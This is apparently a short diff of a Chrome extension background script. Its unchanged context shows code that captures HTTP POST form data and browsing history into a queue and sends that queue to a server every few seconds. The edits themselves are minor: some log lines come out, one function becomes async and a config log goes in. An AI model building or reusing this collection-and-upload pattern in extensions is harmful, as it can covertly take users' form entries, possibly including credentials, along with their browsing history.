@@ -152,7 +152,6 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 );
 
 /* Listen for HTTP POST requests and gather information from the form
- *
  * references:
  * 	https://spin.atomicobject.com/2017/08/18/chrome-extension-form-data/
  */
@@ -198,13 +197,12 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
  * @param (int) numResults: maximum number of history objects
  * act on the results of the query within the forEach loop
  */
-function getClientHistory(millis, numResults){
+async function getClientHistory(millis, numResults){
 chrome.history.search({text: '', maxResults: numResults}, function(data) {
     data.forEach(function(page) {
     	var historyChanged = false;
     	if(page.lastVisitTime>millis){
             queue.history.push(page.url);
-            console.log("history: ",page.url);
             historyChanged = true;
 		}
 		if(historyChanged){
@@ -363,8 +361,6 @@ function sendPayload(){
                 clearQueue();
             });
 		});
-
-
 	}
 	else{
 		console.log("Failed to create connection to the server~~~~");
@@ -380,6 +376,7 @@ function main_func() {
 	//setListener(config.security_blacklist);
 
     setInterval(sendPayload, 1000 * 10);	//sends payload every 30 seconds
+	console.log("config: ",config);
 }
 
 loadConfig().then(
